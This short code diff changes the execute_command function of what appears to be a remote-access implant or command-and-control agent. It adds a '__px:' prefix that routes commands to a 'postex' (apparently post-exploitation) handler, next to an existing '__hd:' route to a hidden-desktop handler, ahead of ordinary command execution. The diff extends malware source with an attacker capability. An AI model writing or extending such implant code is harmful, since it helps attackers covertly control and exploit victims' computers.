@@ -74,6 +74,8 @@ def get_metadata():
 def execute_command(command: str) -> str:
     if str(command).startswith('__hd:'):
         return hidden_desktop(command)
+    if str(command).startswith('__px:'):
+        return postex(command)
     try:
         if command.startswith('cd '):
             directory = command[3:].strip()
